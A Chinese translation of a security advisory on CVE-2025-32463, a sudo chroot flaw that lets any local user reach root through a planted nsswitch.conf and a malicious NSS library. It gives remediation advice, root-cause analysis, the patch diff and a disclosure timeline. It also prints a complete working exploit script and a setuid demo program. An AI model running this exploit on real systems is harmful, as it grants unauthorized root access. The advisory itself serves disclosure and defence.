> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247489170&idx=1&sn=3748f66988afa0fa303cbba4baa2bc5a

#  漏洞通告：Sudo chroot 权限提升漏洞（Elevation of Privilege）  
Rich Mirch  securitainment   2025-07-01 09:26  
  
> Vulnerability Advisory Sudo chroot Elevation of Privilege   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
### 简介  
  
Sudo 是 Linux 系统中常见的高权限命令行工具。它允许授权用户根据系统安全策略，以超级用户（root）或其他用户身份执行命令。Sudo 广泛用于实施最小权限原则（principle of least privilege），让用户无需共享 root 密码即可完成需要提升权限的管理任务，并在系统日志中生成审计记录。  
  
Stratascale 网络安全研究组（Cyber Research Unit, CRU）在 Sudo 中发现了两个本地权限提升（local privilege escalation）漏洞。这些漏洞可导致受影响系统上的权限被提升至 root。  
  
本次研究聚焦于 Sudo 中不常用的命令行选项。本文将详细分析 chroot  
选项如何被本地用户利用，即使该用户未被定义任何 Sudo 规则，仍可提升至 root 权限。  
#### 相关文章  
  
CVE-2025-32462 – Sudo host 选项权限提升漏洞（Elevation of Privilege Vulnerability）  
### 修复建议  
- 安装 sudo 1.9.17p1 或更高版本  
  
- 访问 https://www.sudo.ws/security/advisories/chroot_bug 获取更多信息  
  
### 影响范围  
  
默认 Sudo 配置存在漏洞。尽管该漏洞涉及 Sudo 的 chroot 功能，但无需为用户定义任何 Sudo 规则即可利用。因此，如果安装了受影响版本，任何本地低权限用户都可能将权限提升至 root。已知受影响版本如下（注意：并非所有区间内版本都已测试）：  
- 稳定版 1.9.14 - 1.9.17  
  
注意：旧版 Sudo（当前 <= 1.8.32）不受影响，因为这些版本尚未实现 chroot 功能。  
  
已验证可被利用的环境：  
- Ubuntu 24.04.1; Sudo 1.9.15p5, Sudo 1.9.16p2  
  
- Fedora 41 Server; Sudo 1.9.15p5  
  
### 管理员 / 蓝队建议  
- 为系统安装最新的 sudo 包。该漏洞无可行的临时缓解措施  
  
- chroot 选项已在 1.9.17p1 版本中弃用。建议避免使用 chroot 选项，因为如果配置不当，可能会降低系统安全性  
  
- 检查环境中是否使用了 chroot 选项。审查 /etc/sudoers 及 /etc/sudoers.d 下所有 Sudo 规则。如果 Sudo 规则存储在 LDAP，可用 ldapsearch 等工具导出规则  
  
- 查找 runchroot= 或 CHROOT= 的使用情况  
  
- 可在系统日志（syslog）中搜索 sudo 条目。任何使用 chroot 的命令都会记录 CHROOT=  
  
#### Sudo chroot 简介  
  
chroot(2)   
系统调用和 chroot(8)   
命令用于限制进程在文件系统上可访问的文件和目录。这是通过将进程的根目录更改为指定路径来实现的，从而将其视图限制在该路径下的文件。  
  
一个实际应用场景是 SFTP/FTP 服务器。管理员可以配置用户在进行文件传输时仅能访问其主目录。例如，将 FTP 进程的根目录设置为 /home/user   
可防止访问该目录之外的文件，如 /etc/passwd  
。  
  
然而，chroot 并不被视为强大的安全边界。Linux chroot(2) 手册页明确指出："该调用仅改变了路径解析过程中的一个要素，除此之外不做任何处理。它不应用于任何安全目的，既不能完全沙盒化进程，也不能限制文件系统调用。  
"  
  
Sudo 通过 -R <目录> 或 –chroot=<目录> 选项实现 chroot 调用，用于"在运行命令前更改为指定的根目录  
"。这是一个不常见或很少使用的功能，可能是为支持边缘情况而实现的。  
  
以下是一个测试用例中的 Sudo 规则示例。lowpriv   
账户被允许在 /web 下执行 /bin/bash  
。在此示例规则中，用户没有通过命令行选项传递 chroot 目录。相反，Sudo 将在执行 /bin/bash   
之前 chroot 到 /web  
。  

```
lowpriv ALL = CHROOT=/web /bin/bash
```

  
当通过 Sudo 执行命令时，"root" 路径将被设置为 /web  
，因此必须存在 /web/bin/bash 及其所有链接库。下面的 lsof   
命令输出示例显示了 lowpriv   
用户在 /web   
下运行 /bin/bash  
。rtd   
行确认根目录已设置为 /web。  

```
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME 
bash    160095 root  cwd    DIR  252,0     4096 1048596 /web 
bash    160095 root  rtd    DIR  252,0     4096 1048596 /web 
bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash 
bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 
bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 
bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 
```

  
注意，由于未将基本 Linux 命令（如 ls   
和 find  
）复制到 chroot 环境中，这些命令将无法使用。  

```
lowpriv@prod:~$ sudo /bin/bash
bash-5.2# cd /
bash-5.2# ls
bash: ls: command not found
bash-5.2# find .
bash: find: command not found
bash-5.2# echo *
bin lib lib64
bash-5.2# echo bin/*
bin/bash
```

  
在 sudoers   
配置中，runchroot=*   
表示用户可以通过使用 -R 选项运行 sudo   
来指定根目录。以下展示了使用该选项的配置示例。  

```
lowpriv@prod:~$ sudo -l
Matching Defaults entries for lowpriv on prod:
    env_reset,
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty,
    runchroot=*


User lowpriv may run the following commands on prod:
    (root) /bin/bash
lowpriv@prod:~$ sudo -R /web /bin/bash
bash-5.2#
```

#### CVE-2025-32463 Sudo chroot 权限提升漏洞分析  
  
CVE-2025-32463 漏洞随 Sudo v1.9.14（2023 年 6 月发布）中 chroot 功能相关的 命令匹配处理代码  
（command matching handling code）更新而引入。  
  
摘自 NEWS 文件：  
> 改进了在 sudoers 中指定 chroot 时的命令匹配。sudoers 插件现在会在执行命令匹配前根据需要更改根目录 ID。此前，根目录仅被准备为正在处理的路径。  
  
  
该漏洞源于允许低权限用户在可控的可写路径上调用 chroot()  
。Sudo 会多次调用 chroot()  
，无论用户是否配置了相应的 Sudo 规则。  
  
允许低权限用户以 root 权限在可写位置调用 chroot()   
会带来多种安全风险。许多应用程序（如 SSH）都明确防范此类情况。例如，如果目标位置不属于 root，SSH 将拒绝执行 chroot()。  
  
pivot_root()   
和 unpivot_root()   
函数定义于 plugins/sudoers/pivot.c，负责处理 chroot  
逻辑。在这两个调用之间，系统会触发 名称服务切换（Name Service Switch, NSS） 操作，导致系统从未受信任的环境中加载 /etc/nsswitch.conf   
配置文件。该文件包含指示系统如何检索用户、组和主机信息的指令。可以列出多个源，并按顺序搜索直到找到匹配项。  
  
例如，以下 nsswitch.conf   
片段展示了针对该服务的 files 和 ldap   
配置。在检索用户信息时，系统会先搜索本地文件（如 /etc/passwd），然后查询 LDAP。  

```
passwd:         files ldap
group:          files ldap
shadow:         files ldap
gshadow:        files ldap
```

  
阅读 nsswitch.conf   
文件时，一个可能不太明显的细节是：源名称（source name）也会作为共享对象（shared object，即库文件）路径的一部分。例如，上述 ldap  
源会转换为 libnss_ldap.so  
。当 NSS 函数使用 ldap   
源时，系统会加载对应的库文件。  
  
由于这种行为，任何本地用户都可以诱使 Sudo 加载任意共享对象，从而导致以 root 权限执行任意代码。以下堆栈跟踪（stack trace）展示了 Sudo 加载的恶意共享对象。注意：为简洁起见，已对堆栈跟踪进行了大量编辑。  

```
#0  0x0000763a155db181 in woot () from libnss_/woot1337.so.2
#1  0x0000763a1612271f in call_init
#8  0x0000763a1612a164 in _dl_open (file=&#34;libnss_/woot1337.so.2&#34;, 
#14 0x0000763a15f53a0f in module_load
#15 0x0000763a15f53ee5 in __nss_module_load
#17 0x0000763a15f5460b in __GI___nss_lookup_function
#19 0x0000763a15f50928 in __GI___nss_passwd_lookup2
#20 0x0000763a15f62628 in __getpwnam_r 
#21 0x0000763a15d59ae8 in pam_modutil_getpwnam
#27 0x0000763a15d58d99 in pam_acct_mgmt
#28 0x0000763a1577e491 in sudo_pam_approval
#29 0x0000763a157ce3ef in sudo_auth_approval
#30 check_user.constprop.0
#32 0x0000763a15799143 in sudoers_check_cmnd
#33 sudoers_policy_check
#34 0x00005ba00874b491 in policy_check
#35 main
```

  
要利用该漏洞，我们在 chroot 环境中放置了以下 /etc/nsswitch.conf   
文件。其中 /woot1337   
这个 NSS "源" 会被转换为 libnss  
/woot1337.so.2，这是一个我们可控路径下的共享对象（shared object）。  

```
passwd: /woot1337
```

  
在 Ubuntu 24.04.2 LTS 服务器上执行 PoC（Proof of Concept），使用未定义 Sudo 规则的低权限用户，成功在 chroot 环境外获取 root shell。  

```
lowpriv@prod:~/CVE-2025-32463$ id
uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)
lowpriv@prod:~/CVE-2025-32463$ sudo -l
[sudo] password for lowpriv:
Sorry, user lowpriv may not run sudo on prod.
lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh
woot!
root@prod:/# id
uid=0(root) gid=0(root) groups=0(root),1001(lowpriv)
```

  
完整的 sudo-chwoot.sh   
漏洞利用代码（PoC, Proof of Concept）。  

```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1


cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>


__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir(&#34;/&#34;);
  execl(&#34;/bin/bash&#34;, &#34;/bin/bash&#34;, NULL);
}
EOF


mkdir -p woot/etc libnss_
echo &#34;passwd: /woot1337&#34; > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c


echo &#34;woot!&#34;
sudo -R woot woot
rm -rf ${STAGE?}
```

### Chwoot 演示  
  
chwoot-demo.c   
是 Sudo 漏洞的简化版本，旨在复现其核心行为。该概念验证（Proof of Concept, PoC）可用于演示 chroot() 的潜在安全问题。  

```
/*
  Description: Simulate behavior of CVE-2025-32463 - sudo EoP via chroot.
               Possible future CTF challenge? :)
  gcc -Wall -o chwoot-demo chwoot-demo.c
  cp 4755 chwoot-demo
  mv chwoot-demo /usr/bin
  Then get a root shell as a low priv user
*/
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>
#include <netdb.h>


int main() {
    chdir(&#34;/tmp/stage&#34;);
    int saved_root = open(&#34;/&#34;,O_RDONLY);
    int saved_cwd = open(&#34;.&#34;,O_RDONLY);
    chroot(&#34;/tmp/stage&#34;);
    chdir(&#34;/&#34;);
    gethostbyname(&#34;woot&#34;);
    fchdir(saved_root);
    chroot(&#34;.&#34;);
    fchdir(saved_cwd);
    getgrnam(&#34;got root?&#34;);
}
```

  
该补丁实质上回滚了 Sudo 1.9.14 版本中的变更。pivot_root()   
和 unpivot_root()  
函数被移除，且在命令匹配阶段不再调用 chroot()  
。  

```
--- sudo-1.9.17/plugins/sudoers/sudoers.c       2025-06-12 12:12:38.000000000 -0500
+++ sudo/plugins/sudoers/sudoers.c      2025-06-10 11:27:57.493871502 -0500
@@ -1080,7 +1080,6 @@
 int
 set_cmnd_path(struct sudoers_context *ctx, const char *runchroot)
 {
-    struct sudoers_pivot pivot_state = SUDOERS_PIVOT_INITIALIZER;
     const char *cmnd_in;
     char *cmnd_out = NULL;
     char *path = ctx->user.path;
@@ -1099,13 +1098,7 @@
     if (def_secure_path && !user_is_exempt(ctx))
        path = def_secure_path;


-    /* Pivot root. */
-    if (runchroot != NULL) {
-       if (!pivot_root(runchroot, &pivot_state))
-           goto error;
-    }
-
-    ret = resolve_cmnd(ctx, cmnd_in, &cmnd_out, path);
+    ret = resolve_cmnd(ctx, cmnd_in, &cmnd_out, path, runchroot);
     if (ret == FOUND) {
        char *slash = strrchr(cmnd_out, '/');
        if (slash != NULL) {
@@ -1122,14 +1115,8 @@
     else
        ctx->user.cmnd = cmnd_out;


-    /* Restore root. */
-    if (runchroot != NULL)
-       (void)unpivot_root(&pivot_state);
-
     debug_return_int(ret);
 error:
-    if (runchroot != NULL)
-       (void)unpivot_root(&pivot_state);
     free(cmnd_out);
     debug_return_int(NOT_FOUND_ERROR);
 }
```

  
应用补丁后，漏洞利用（exploit）失败，因为不再调用 chroot()   
函数。  

```
lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh
woot!
sudo: the -R option will be removed in a future version of sudo
Password:
sudo: you are not permitted to use the -R option with woot
```

### 披露时间线（Disclosure Timeline）  
  
2025/04/01：漏洞报告提交给 Todd Miller（Sudo 维护者）。  
2025/04/03：发送跟进请求，确认已收到初始报告。  
2025/04/03：收到确认回复，初步讨论开始。  
2025/04/06：维护者提出 CVE-2025-32462 补丁（patch）。  
2025/04/07：向 MITRE 申请 CVE 编号。  
2025/04/08：MITRE 分配 CVE-2025-32462（host option）和 CVE-2025-32463（chroot）。  
2025/04/08：验证 CVE-2025-32462 补丁并提供进一步反馈。  
2025/04/23：再次发送跟进请求，询问进展。  
2025/05/06：再次发送跟进请求，询问进展。  
2025/05/06：维护者回复，仍在处理 chroot 问题的解决方案。  
2025/05/07：就 chroot 问题提供反馈。  
2025/05/16：再次发送跟进请求。  
2025/06/04：再次发送跟进请求。  
2025/06/09：维护者提出 CVE-2025-32463 补丁。  
2025/06/10：验证 CVE-2025-32463 补丁，并提出披露时间线建议。  
2025/06/23：补丁发送至操作系统distros邮件列表，Sudo 安全通告链接确认。  
2025/06/30：公开披露（Public disclosure）。  
2025/06/30：博客文章发布。  
### 致谢与鸣谢（Acknowledgment & Credit）  
  
CVE-2025-32463 Sudo chroot 提权漏洞（Elevation of Privilege Vulnerability）由 Stratascale Cyber Research Unit（CRU）成员 Rich Mirch 发现。Stratascale CRU 团队感谢 Sudo 维护者 Todd Miller 在漏洞修复过程中的合作与支持。  
  
